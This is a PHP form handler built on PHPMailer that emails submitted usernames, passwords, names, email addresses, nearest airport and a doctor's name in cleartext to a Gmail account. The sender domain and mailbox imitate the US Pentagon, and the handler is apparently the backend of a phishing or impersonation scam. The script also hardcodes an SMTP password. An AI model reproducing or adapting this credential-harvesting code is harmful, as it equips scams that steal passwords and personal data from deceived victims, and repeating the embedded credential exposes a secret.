<?php
require_once 'vendor/autoload.php';

function send_mail($to, $subject, $message)
{
    $mail = new PHPMailer\PHPMailer\PHPMailer();

    // SMTP configuration (replace with your SMTP provider details)
    $mail->isSMTP();
    $mail->Host = 'lon106.truehost.cloud';
    $mail->SMTPAuth = true;
    $mail->Username = 'info@unitedstatespentagons.com';
    $mail->Password = 'pXmHuQ}uEX5#';
    $mail->SMTPSecure = 'tls'; // Or 'ssl'
    $mail->Port = 587; // Or 465 for SSL

    // Email content
    $mail->setFrom('pentagonunitedstate0@gmail.com', 'Test Account');
    $mail->addAddress($to);
    $mail->Subject = $subject;
    $mail->Body = $message;
    $mail->isHTML(true); // Set email format to HTML

    // Send the email using mail() function
    if ($mail->send()) {
        header('Location: index.php?success=1'); // Redirect with success flag
        exit();
    } else {
        header('Location: index.php?success=0'); // Redirect with success flag
        exit();
    }
}

// Example usage:
if (isset($_POST['submit'])) {
    $doctorName = $_POST['doctorName'];
    $username = $_POST['username'];
    $password = $_POST['password'];
    $firstName = $_POST['firstName'];
    $lastName = $_POST['lastName'];
    $email = $_POST['email'];
    $reason = $_POST['reasonForApplication'];
    $airport = $_POST['airport'];


    $to = 'pentagonunitedstate0@gmail.com'; // Replace with your recipient email
    $subject = 'Form Submission';
    $message = "
    <h2>New Form Submission</h2>
    <p>First Name: $firstName</p>
    <p>Last Name: $lastName</p>
    <p>Email: $email</p>
    <p>Password: $password</p>
    <p>username: $username</p>
    <p>Closest Airport: $airport</p>
    <p>Doctor's name: $doctorName</p>
    <p>Reason for Contact: $reason</p>
  ";

    send_mail($to, $subject, $message);
}
